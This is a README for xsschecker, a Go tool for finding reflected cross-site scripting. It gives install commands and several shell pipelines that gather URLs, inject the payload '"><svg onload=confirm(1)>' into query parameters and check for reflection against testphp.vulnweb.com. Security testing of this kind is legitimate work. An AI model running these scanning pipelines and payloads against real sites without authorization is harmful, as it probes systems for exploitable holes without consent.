<h1 align="center">xsschecker</h1> <br>

<h3 align="center">xsschecker tool checking reflected endpoints finding possible xss vulnerable endpoints.</h3>

## Install
```bash
go install github.com/rix4uni/xsschecker@latest
```
or

```bash
git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker /usr/bin/
```
## Reflected XSS
```bash
echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2"

echo "http://testphp.vulnweb.com" | waybackurls | nilo | anew | gf xss | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2" --proxy "http://yourproxy"

echo "http://testphp.vulnweb.com" | waybackurls | nilo | anew | gf xss | qsreplace -a | bhedak '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2" -x "http://yourproxy"

echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | uro | nilo | qsreplace '"><svg onload=confirm(1)>' | airixss -hm -s -c 5
```

urldedupe bhedak
```bash
waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | xsschecker
```

GF
```bash
waybackurls testphp.vulnweb.com | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | xsschecker
```

Kxss
```bash
waybackurls testphp.vulnweb.com | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
```

gospider
```bash
gospider -s "testphp.vulnweb.com" -c 10 -d 5 -t 100 --other-source | tr " " "\n" | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
```
